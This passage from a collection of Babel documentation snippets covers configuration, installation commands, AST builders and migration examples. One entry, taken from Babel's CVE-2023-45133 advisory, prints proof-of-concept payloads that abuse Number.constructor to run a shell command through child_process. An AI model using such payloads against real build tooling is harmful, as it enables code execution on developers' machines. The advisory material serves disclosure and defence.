configuration shows how to configure the `@babel/plugin-transform-regenerator` plugin with options in `babel.config.json`. This example disables the transformation of async generators, regular generators, and async functions.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-regenerator.md#_snippet_4\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\n    [\n      \"@babel/plugin-transform-regenerator\",\n      {\n        \"asyncGenerators\": false,\n        \"generators\": false,\n        \"async\": false\n      }\n    ]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Transforming RegExp Difference (JavaScript)\nDESCRIPTION: This example showcases the transformation of a regular expression using the difference of White_Space and ASCII Unicode properties with the `v` flag, converted to a `u` flag regular expression.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-unicode-sets-regex.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\n// Non-ASCII white spaces\n/[\\p{White_Space}--\\p{ASCII}]/v;\n```\n\nLANGUAGE: javascript\nCODE:\n```\n/[\\x85\\xA0\\u1680\\u2000-\\u200A\\u2028\\u2029\\u202F\\u205F\\u3000]/u;\n```\n\n----------------------------------------\n\nTITLE: TSCallSignatureDeclaration AST (Babel 7)\nDESCRIPTION: Babel 7 AST for TSCallSignatureDeclaration, using `parameters` and `typeAnnotation`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_12\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"type\": \"TSCallSignatureDeclaration\",\n  \"parameters\": [\n    { \"type\": \"Identifier\", \"name\": \"x\", \"typeAnnotation\": { \"type\": \"TSNumberKeyword\" } }\n  ],\n  \"typeAnnotation\": {\n    \"type\": \"TSTypeAnnotation\",\n    \"typeAnnotation\": { \"type\": \"TSStringKeyword\" }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Install Babel Dependencies with npm\nDESCRIPTION: This shell command installs the `@rollup/plugin-babel` and `@babel/core` packages as development dependencies using npm. The `--save-dev` flag ensures that these packages are added to the `devDependencies` section of the `package.json` file.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/rollup/install.md#_snippet_0\n\nLANGUAGE: Shell Script\nCODE:\n```\nnpm install --save-dev @rollup/plugin-babel @babel/core\n```\n\n----------------------------------------\n\nTITLE: Transformed Async Do Expression JavaScript\nDESCRIPTION: This JavaScript code represents the transformed output of the `async do` expressions from the previous example.  It shows how the `async do` expressions are converted into immediately invoked async arrow functions.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-async-do-expressions.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nPromise.all([\n  (async () {\n    const result = await fetch('https://example.com/A');\n    return await result.json()\n  })(),\n  (async () {\n    const result = await fetch('https://example.org/B');\n    return await result.json()\n  })(),\n]).then(([a, b]) => {\n  console.log(\"example.com/A\", a);\n  console.log(\"example.org/B\", b);\n})\n```\n\n----------------------------------------\n\nTITLE: Configuration via babel.config.json\nDESCRIPTION: This JSON configuration file shows how to enable the plugin by adding it to the 'plugins' array. This is the recommended method.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-strict-mode.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-strict-mode\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Uninstall and Install ESLint Packages (npm)\nDESCRIPTION: This command uninstalls the old babel-eslint and babel-eslint-plugin packages and installs the new @babel/eslint-parser and @babel/eslint-plugin packages as development dependencies using npm.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2020-07-13-the-state-of-babel-eslint.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm uninstall babel-eslint babel-eslint-plugin\nnpm install --save-dev @babel/eslint-parser @babel/eslint-plugin\n```\n\n----------------------------------------\n\nTITLE: Defining InterpreterDirective Node\nDESCRIPTION: This code snippet demonstrates the structure of the new `InterpreterDirective` node, which contains the `type` and `value` properties. This node represents the interpreter directive (shebang) in the AST.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration-api.md#_snippet_9\n\nLANGUAGE: JavaScript\nCODE:\n```\ninterface InterpreterDirective <: Node {\n    type: \"InterpreterDirective\";\n    value: string;\n}\n```\n\n----------------------------------------\n\nTITLE: Splitting TSExpressionWithTypeArguments in Babel 8 (TS)\nDESCRIPTION: This snippet illustrates the splitting of `TSExpressionWithTypeArguments` into `TSClassImplements` and `TSInterfaceHeritage` in Babel 8. This change provides more specific node types for class implementations and interface inheritance, respectively. Additionally, the `typeParameters` property is renamed to `typeArguments`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_42\n\nLANGUAGE: typescript\nCODE:\n```\nclass C implements X<T> {}\n\n// AST in Babel 7\n{\n  type: \"ClassDeclaration\",\n  id: Identifier(\"C\"),\n  implements: [\n    {\n      type: \"TSExpressionWithTypeArguments\",\n      expression: Identifier(\"X\"),\n      typeParameters: {\n        type: \"TSTypeParameterInstantiation\",\n        params: [TSTypeReference(Identifier(\"T\"))]\n      }\n    }\n  ],\n  body: ClassBody([]),\n}\n\n// AST in Babel 8\n{\n  type: \"ClassDeclaration\",\n  id: Identifier(\"C\"),\n  implements: [\n    {\n      type: \"TSClassImplements\",\n      expression: Identifier(\"X\"),\n      typeArguments: {\n        type: \"TSTypeParameterInstantiation\",\n        params: [TSTypeReference(Identifier(\"T\"))]\n      }\n    }\n  ],\n  body: ClassBody([]),\n}\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Plugin - With Options\nDESCRIPTION: This JSON configuration demonstrates how to enable the babel-plugin-minify-dead-code-elimination plugin with a specific option, 'optimizeRawSize', set to true. This option can further optimize the dead code elimination process.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-dead-code-elimination.md#_snippet_4\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"minify-dead-code-elimination\", { \"optimizeRawSize\": true }]\n}\n```\n\n----------------------------------------\n\nTITLE: Using Babel Preset ES2017 via Node API\nDESCRIPTION: This JavaScript code snippet shows how to use the @babel/preset-es2017 preset when using the Babel Node API. It uses `require(\"@babel/core\").transformSync` to transform code, passing the preset in the options object.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-es2017.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  presets: [\"@babel/preset-es2017\"]\n});\n```\n\n----------------------------------------\n\nTITLE: F# Pipeline with Async/Await\nDESCRIPTION: This JavaScript code demonstrates how F# Pipelines handle `await` by treating it as a unary function. This allows for using `await` within a pipeline to handle Promise-returning functions.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-07-19-whats-happening-with-the-pipeline-proposal.md#_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\npromise |> await\n```\n\n----------------------------------------\n\nTITLE: Node API Usage JavaScript\nDESCRIPTION: This JavaScript code shows how to use the Babel Node API to transform code with the `@babel/plugin-transform-flow-strip-types` plugin. `transformSync` from `@babel/core` is used to transform the code synchronously, applying the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-flow-strip-types.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-flow-strip-types\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Asserting Babel Version in Plugin\nDESCRIPTION: This code snippet illustrates how to assert a specific Babel version within a plugin using the `assertVersion` method. It demonstrates the use of `@babel/helper-plugin-utils` to declare a plugin and check compatibility with Babel 7 or later.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration-api.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport { declare } from \"@babel/helper-plugin-utils\";\n\nexport default declare(api => {\n  api.assertVersion(7);\n  // ...\n});\n```\n\n----------------------------------------\n\nTITLE: Install @babel/preset-typescript\nDESCRIPTION: This command installs the @babel/preset-typescript package as a development dependency using npm.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-typescript.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/preset-typescript\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via CLI\nDESCRIPTION: This shell command executes Babel from the command line, specifying the `@babel/plugin-syntax-optional-catch-binding` plugin. It transpiles `script.js` using the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-optional-catch-binding.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-syntax-optional-catch-binding script.js\n```\n\n----------------------------------------\n\nTITLE: Optimized JSX Transformation with Object Spread\nDESCRIPTION: This code shows the optimized JSX transformation using the native object spread operator.  This is enabled using the `useSpread` option in `@babel/plugin-transform-react-jsx` or `@babel/preset-react`, resulting in the most concise and efficient output.  Requires `@babel/plugin-transform-react-jsx` or `@babel/preset-react` and the `useSpread` option set to `true`.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-11-05-7.7.0.md#_snippet_8\n\nLANGUAGE: jsx\nCODE:\n```\n<a x {...y} />\n\n// 🡇 🡇 🡇\n\nReact.createElement(\"a\", { x: true, ...y });\n```\n\n----------------------------------------\n\nTITLE: Using @babel/standalone in HTML script tags\nDESCRIPTION: This example shows how to use @babel/standalone to transpile JavaScript code within HTML script tags. The script tag must have the type set to text/babel for the library to process it.\nSOURCE: https://github.com/babel/website/blob/main/docs/standalone.md#_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<div id=\"output\"></div>\n<!-- Load Babel -->\n<script src=\"https://unpkg.com/@babel/standalone/babel.min.js\"></script>\n<!-- Your custom script here -->\n<script type=\"text/babel\">\n  const getMessage = () => \"Hello World\";\n  document.getElementById(\"output\").innerHTML = getMessage();\n</script>\n```\n\n----------------------------------------\n\nTITLE: useBuiltIns: 'usage' - Transformed b.js\nDESCRIPTION: The transformed `b.js` file after Babel processes it with `useBuiltIns: 'usage'`. It imports the `es.map` polyfill from core-js if Maps are not supported in the target environment.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-env.md#_snippet_13\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport \"core-js/modules/es.map\";\nvar b = new Map();\n```\n\n----------------------------------------\n\nTITLE: Install Babel Plugin via NPM\nDESCRIPTION: This command installs the babel-plugin-minify-builtins package as a development dependency using npm. This plugin is used to minimize built-in functions during the Babel transformation process.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-builtins.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install babel-plugin-minify-builtins --save-dev\n```\n\n----------------------------------------\n\nTITLE: Async Function Transformation Input JavaScript\nDESCRIPTION: This example demonstrates the input JavaScript code containing an async function that uses the await keyword. It shows the basic syntax of an async function.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-async-to-generator.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nasync function foo() {\n  await bar();\n}\n```\n\n----------------------------------------\n\nTITLE: Install @babel/plugin-transform-unicode-regex\nDESCRIPTION: This command installs the @babel/plugin-transform-unicode-regex package as a development dependency using npm. npm2yarn is a comment that suggests it can be translated into a yarn command.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-unicode-regex.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-unicode-regex\n```\n\n----------------------------------------\n\nTITLE: Pipeline Operator in Babel 8\nDESCRIPTION: Shows the pipeline operator in Babel 8 for chaining function calls in a readable manner.\nSOURCE: https://github.com/babel/website/blob/main/docs/parser.md#_snippet_17\n\nLANGUAGE: javascript\nCODE:\n```\na |> b\n```\n\n----------------------------------------\n\nTITLE: Emit Parens for Await of Ternary Expressions - JavaScript\nDESCRIPTION: This code demonstrates how the babel generator emits parenthesis for await of ternary expressions. This ensures that the `await` operator has correct precedence and avoids potential parsing errors.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-02-13-6.23.0.md#_snippet_11\n\nLANGUAGE: javascript\nCODE:\n```\nasync function asdf() {\n  await (1 ? 2 : 3);\n}\n```\n\n----------------------------------------\n\nTITLE: Inline SVG with preval.macro in Next.js\nDESCRIPTION: This example demonstrates how to use `preval.macro` to inline an SVG file in a Next.js application. The `preval.require` function reads the SVG file at build time and inlines its base64 representation into the `backgroundImage` style of a Glamorous component. This eliminates the need for runtime file reading and provides a more explicit way to manage code transformations.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-09-11-zero-config-with-babel-macros.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\n// search.js\n// this file runs in the browser\nimport preval from 'preval.macro'\nimport glamorous from 'glamorous'\n\nconst base64SearchSVG = preval.require('./search-svg')\n// this will be transpiled to something like:\n// const base64SearchSVG = 'PD94bWwgdmVyc2lv...etc...')\n\nconst SearchBox = glamorous.input('algolia_searchbox', props => ({\n  backgroundImage: `url(\"data:image/svg+xml;base64,${base64SearchSVG}\")`,\n  // ...\n}))\n\n\n// search-svg.js\n// this file runs at build-time only\n// because it's required using preval.require function, which is a macro!\nconst fs = require('fs')\nconst path = require('path')\n\nconst svgPath = path.join(__dirname, 'svgs/search.svg')\nconst svgString = fs.readFileSync(svgPath, 'utf8')\nconst base64String = new Buffer(svgString).toString('base64')\n\nmodule.exports = base64String\n```\n\n----------------------------------------\n\nTITLE: Run Babel with Plugin via CLI\nDESCRIPTION: This command line instruction shows how to run Babel with the minify-builtins plugin enabled.  It transforms the script.js file using the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-builtins.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins minify-builtins script.js\n```\n\n----------------------------------------\n\nTITLE: Creating a Program Node in Babel\nDESCRIPTION: Creates a `Program` AST node using the Babel types module. This node represents the root of an AST, accepting an array of body statements, directives, a source type and an interpreter directive.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_142\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.program(body, directives, sourceType, interpreter);\n```\n\n----------------------------------------\n\nTITLE: Babel Node API Usage JavaScript\nDESCRIPTION: Example of using the Babel Node API to transform code with the @babel/plugin-proposal-function-bind plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-function-bind.md#_snippet_8\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-proposal-function-bind\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Creating an ObjectMethod in JavaScript\nDESCRIPTION: This code snippet shows how to create an `ObjectMethod` AST node using `t.objectMethod(kind, key, params, body, computed, generator, async)`.  It allows defining methods within an object literal. Parameters include the method's kind (method, get, set), key, parameters, body, and flags for computed keys, generator, and async functions.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_123\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.objectMethod(kind, key, params, body, computed, generator, async);\n```\n\n----------------------------------------\n\nTITLE: Configuration: Babel Plugin Configuration (JSON)\nDESCRIPTION: Configuration details for the babel-plugin-minify-numeric-literals Babel plugin. This JSON snippet shows how to enable the plugin in a babel.config.json file.  It adds 'minify-numeric-literals' to the plugins array, allowing Babel to use it when processing JavaScript files.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-numeric-literals.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"minify-numeric-literals\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Installing @babel/plugin-syntax-jsx\nDESCRIPTION: This command installs the @babel/plugin-syntax-jsx package as a development dependency using npm or yarn.  It allows Babel to parse JSX syntax in JavaScript files.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-jsx.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-syntax-jsx\n```\n\n----------------------------------------\n\nTITLE: Checking for TSType Nodes in JavaScript\nDESCRIPTION: This snippet demonstrates how to use Babel's `t.isTSType` method to check if a given AST node is a TypeScript type. It returns `true` if the node represents any TypeScript type annotation and `false` otherwise. This method is essential for analyzing and transforming TypeScript code within a Babel plugin or tool.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_296\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.isTSType(node);\n```\n\n----------------------------------------\n\nTITLE: Use Babel Preset Flow CLI Shell\nDESCRIPTION: This command-line example demonstrates how to use the @babel/preset-flow preset with the Babel CLI to transform a JavaScript file.  It uses the babel command.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-flow.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --presets @babel/preset-flow script.js\n```\n\n----------------------------------------\n\nTITLE: Creating ForStatement in JavaScript\nDESCRIPTION: This snippet demonstrates how to create a `ForStatement` AST node using Babel's `t.forStatement` method. The `init` (a `VariableDeclaration` or `Expression`), `test` (an `Expression`), and `update` (an `Expression`) parameters are optional. The `body` (a `Statement`) parameter is required. This node represents a standard `for` loop.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_71\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.forStatement(init, test, update, body);\n```\n\n----------------------------------------\n\nTITLE: Preset ES6 Default Export JavaScript\nDESCRIPTION: Illustrates the change that allows presets to be ES6 default exports instead of just CommonJS exports. Provides an example showing how to export a default object with plugins.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-09-28-6.16.0.md#_snippet_10\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport syntaxTrailingCommas from \"...\";\nexport default {\n  plugins: [\n    syntaxTrailingCommas\n  ]\n};\n```\n\n----------------------------------------\n\nTITLE: Using Babili CLI\nDESCRIPTION: This snippet shows how to use the Babili CLI tool to minify JavaScript files.  The `babili src -d lib` command minifies files in the `src` directory and outputs the minified files to the `lib` directory. It's equivalent to running `babel` with the babili preset.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-08-26-babili.md#_snippet_9\n\nLANGUAGE: Shell\nCODE:\n```\n$ babili src -d lib\n# equivalent to\n# babel src -d lib --presets=babili --no-babelrc\n```\n\n----------------------------------------\n\nTITLE: Add Webpacker gem to Gemfile - Ruby\nDESCRIPTION: This code snippet adds the `webpacker` gem to the Rails application's Gemfile. This gem is required for integrating Webpack, which includes Babel, into the asset pipeline. After adding the gem, you need to run `bundle install`.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/rails/install.md#_snippet_0\n\nLANGUAGE: Ruby\nCODE:\n```\n# Gemfile\ngem 'webpacker'\n```\n\n----------------------------------------\n\nTITLE: Configure ignoreExtensions for Vue files - JavaScript\nDESCRIPTION: This code snippet shows how to configure the `ignoreExtensions` option in `@babel/preset-typescript` when transpiling `.vue` files. It ensures that only the TypeScript part is transformed, preserving the JSX format.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration.md#_snippet_8\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  overrides: [{\n    include: /\\.vue$/,\n    presets: [\n      ['@babel/preset-typescript', {\n        ignoreExtensions: true\n      }]\n    ]\n  }]\n}\n```\n\n----------------------------------------\n\nTITLE: Correct Preset Configuration (JavaScript)\nDESCRIPTION: This snippet demonstrates the correct way to configure Babel presets when using options.  The preset name and options are wrapped in an array. This ensures that Babel correctly parses the preset and applies the specified options.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-10-24-6.18.0.md#_snippet_8\n\nLANGUAGE: JavaScript\nCODE:\n```\n// correct\n{\n  \"presets\": [\n    [\"preset\",\n      {\n        \"presetOptions\": 'hi'\n      }\n    ]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Configure Object Assign Plugin in babel.config.json\nDESCRIPTION: Example configuration showing how to enable the @babel/plugin-transform-object-assign plugin within a babel.config.json file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-object-assign.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-object-assign\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Alternative Payload Formats Using Type Coercion (JavaScript)\nDESCRIPTION: These code snippets demonstrate alternative payload formats that use type coercion to trigger the malicious function defined in the `toString` or `valueOf` property of an object. The first example uses string concatenation, while the second uses addition to trigger the function. These examples bypass the need for the `String` constructor.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2023-10-16-cve-2023-45133.md#_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\n\"\"+(({  toString: Number.constructor(\"console.log(process.mainModule.require('child_process').execSync('id').toString())\")}));\n```\n\nLANGUAGE: javascript\nCODE:\n```\n1+(({  valueOf: Number.constructor(\"console.log(process.mainModule.require('child_process').execSync('id').toString())\")}));\n```\n\n----------------------------------------\n\nTITLE: Configure babel-plugin-minify-infinity in babel.config.json JSON\nDESCRIPTION: This JSON snippet shows how to configure the babel-plugin-minify-infinity plugin within a babel.config.json file. This is the recommended way to use the plugin. The plugin is added to the `plugins` array.  This file needs to be located in the root of the project.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-infinity.md#_snippet_2\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"minify-infinity\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Download Babel Loader with JSPM\nDESCRIPTION: This shell command downloads and installs the Babel loader for JSPM, enabling Babel transpilation for the project. It is used to switch an existing JSPM project to use Babel.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/jspm/install.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\njspm dl-loader --babel\n```\n\n----------------------------------------\n\nTITLE: Plugin Installation via npm\nDESCRIPTION: Installation command for the Babel plugin using npm. This command adds the plugin as a development dependency to your project.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-arrow-functions.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-arrow-functions\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel for Dynamic Import with AMD\nDESCRIPTION: This snippet demonstrates a valid Babel configuration for using the `@babel/plugin-proposal-dynamic-import` plugin alongside `@babel/plugin-transform-modules-amd`. This is required because Babel needs to know which module loading system to target.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-07-03-7.5.0.md#_snippet_8\n\nLANGUAGE: JavaScript\nCODE:\n```\nmodule.exports = {\n  plugins: [\n    \"@babel/plugin-proposal-dynamic-import\",\n    \"@babel/plugin-transform-modules-amd\"\n  ]\n};\n\n```\n\n----------------------------------------\n\nTITLE: Babel Polyfill Usage: Input\nDESCRIPTION: This shows the original ES code using `babel-polyfill` before transformation.  It imports the entire polyfill library to provide support for newer JavaScript features in older environments.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-12-07-the-state-of-babel.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport \"babel-polyfill\";\n```\n\n----------------------------------------\n\nTITLE: Minifying JavaScript with Node API (alternative)\nDESCRIPTION: An alternative demonstration of using the babel-minify Node API.  It showcases using input, minifyOptions, and overrides parameters. Refer to babel-preset-minify options for more details.\nSOURCE: https://github.com/babel/website/blob/main/docs/minify.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst minify = require(\"babel-minify\");\n\nminify(input, minifyOptions, overrides);\n```\n\n----------------------------------------\n\nTITLE: Loose mode output JavaScript\nDESCRIPTION: Shows the transformed JavaScript code in loose mode. The nullish coalescing operator is converted to a series of checks using `!= null` which is a loose equality check.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-nullish-coalescing-operator.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar _object$foo;\n\nvar foo = (_object$foo = object.foo) != null ? _object$foo : \"default\";\n```\n\n----------------------------------------\n\nTITLE: Checking for ImportOrExportDeclaration Nodes in JavaScript\nDESCRIPTION: Checks if a given AST node is an `ImportDeclaration` or an `ExportDeclaration`. It uses the `t.isImportOrExportDeclaration(node)` method from Babel's `types` API.  It covers nodes such as `ExportAllDeclaration`, `ExportDefaultDeclaration`, `ExportNamedDeclaration`, and `ImportDeclaration`.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_276\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.isImportOrExportDeclaration(node);\n```\n\n----------------------------------------\n\nTITLE: Declaring Uninitialized Class Fields in TypeScript\nDESCRIPTION: This snippet shows how to declare uninitialized class fields in TypeScript using the `declare` keyword.  This prevents the fields from being automatically initialized to `undefined`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration.md#_snippet_17\n\nLANGUAGE: typescript\nCODE:\n```\nclass A {\n  foo: string | void; // initialized to undefined\n  declare bar: number; // type-only, will be removed\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Class Property (JavaScript)\nDESCRIPTION: Creates a `ClassProperty` AST node. This node represents a property within a class. Parameters include the property's key (`key`), value (`value`), type annotation (`typeAnnotation`), decorators (`decorators`), computed flag (`computed`), and static flag (`static`).\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_28\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.classProperty(key, value, typeAnnotation, decorators, computed, static);\n```\n\n----------------------------------------\n\nTITLE: Modifying package.json for Babel dependencies\nDESCRIPTION: Demonstrates the changes made to the `package.json` file after installing Babel CLI and core. It shows how `@babel/cli` and `@babel/core` are added as development dependencies.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/babel_cli/install.md#_snippet_1\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"devDependencies\": {\n+   \"@babel/cli\": \"^7.0.0\",\n+   \"@babel/core\": \"^7.0.0\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel with `useBuiltIns` and webpack 2\nDESCRIPTION: This configuration targets Chrome 55 and enables `useBuiltIns` for polyfilling, also disabling module transformation. The `modules: false` setting is used to prevent Babel from transforming modules, allowing webpack to handle module bundling instead.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-12-07-the-state-of-babel.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\n  \"presets\": [\n    [\"env\", {\n      \"targets\": {\n        \"chrome\": 55\n      },\n      \"modules\": false,\n      \"useBuiltIns\": true\n    }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Install @babel/helper-module-imports with npm\nDESCRIPTION: Installs the @babel/helper-module-imports package using npm. This is a prerequisite for using the helper functions in Babel plugins.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-module-imports.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install @babel/helper-module-imports --save\n```\n\n----------------------------------------\n\nTITLE: Running Tests with lab-babel\nDESCRIPTION: This command configures the `lab` testing framework to use `lab-babel` for transpiling the code before running tests. This is necessary when your project uses Babel and requires transpilation before execution.  The `-T` flag specifies the transpiler module to be used.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/lab/usage.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nlab -T node_modules/lab-babel\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin Via Node API: JavaScript\nDESCRIPTION: This code shows how to use the `@babel/plugin-transform-reserved-words` plugin programmatically via the Node API.  It transforms the given code string using the plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-reserved-words.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-reserved-words\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Creating a TSExpressionWithTypeArguments Node in JavaScript\nDESCRIPTION: This snippet demonstrates the creation of a `TSExpressionWithTypeArguments` AST node using the `t.tsExpressionWithTypeArguments` builder function. It requires an expression which is a `TSEntityName` and an optional `TSTypeParameterInstantiation`. This node represents a type expression with type arguments in TypeScript.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_173\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsExpressionWithTypeArguments(expression, typeParameters);\n```\n\n----------------------------------------\n\nTITLE: Explicit Resource Management Usage (JavaScript)\nDESCRIPTION: Demonstrates synchronous disposal using `using` in Explicit Resource Management. The `fileHandle` is automatically closed at the end of the block.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2023-05-26-7.22.0.md#_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  using fileHandle = filesystem.open(\"./my/file.txt\");\n\n  write(fileHandle, \"Hello!\");\n} // At the end of the block, fileHandle will be automatically closed.\n```\n\n----------------------------------------\n\nTITLE: Transform for-of Loop (Output)\nDESCRIPTION: This JavaScript code is the result of transforming the for-of loop. It uses a try-catch-finally block to handle iterator completion and errors, ensuring compatibility with older JavaScript environments. The code emulates the behavior of the for-of loop using standard ES5 constructs.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-for-of.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nvar _iteratorNormalCompletion = true;\nvar _didIteratorError = false;\nvar _iteratorError = undefined;\n\ntry {\n  for (\n    var _iterator = foo[Symbol.iterator](), _step;\n    !(_iteratorNormalCompletion = (_step = _iterator.next()).done);\n    _iteratorNormalCompletion = true\n  ) {\n    var i = _step.value;\n  }\n} catch (err) {\n  _didIteratorError = true;\n  _iteratorError = err;\n} finally {\n  try {\n    if (!_iteratorNormalCompletion && _iterator.return != null) {\n      _iterator.return();\n    }\n  } finally {\n    if (_didIteratorError) {\n      throw _iteratorError;\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Install Object Assign Plugin\nDESCRIPTION: Command to install the 